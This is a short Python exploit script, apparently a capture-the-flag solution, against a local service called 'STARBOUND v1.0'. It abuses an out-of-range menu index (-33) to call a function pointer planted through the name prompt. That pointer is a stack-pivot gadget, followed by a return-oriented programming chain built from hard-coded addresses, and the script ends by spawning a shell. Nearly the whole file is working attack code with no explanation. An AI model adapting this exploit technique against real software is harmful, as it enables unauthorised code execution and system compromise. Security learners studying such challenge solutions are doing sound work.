#!/usr/bin/env python

'''
Menu options may out of range (<0 or >=10)
'''

from util import *

s = service()
s.connect('127.0.0.1', 8888)
s.recvuntil('-+STARBOUND v1.0+-')

s.recvuntil('> ')
s.send('6\n')
s.recvuntil('> ')
s.send('2\n')
s.recvuntil('Enter your name: ')
s.send(p32(0x0804997E) + '\n')    # 1) prepare function pointer: add esp, 0x1c; retn;

rop_chain = s.rop_setup(
    read = 0x08048A70, 
    write = 0x08048A30,
    leave = 0x0804A673, 
    buf = 0x08058BF0,
    pop_bx_si_di_bp = 0x080496E3)
s.recvuntil('> ')
s.send('-33 AAAA' + rop_chain + '\n')  # 2) ROP chaining start from here

s.pwn_shell()

s.close()
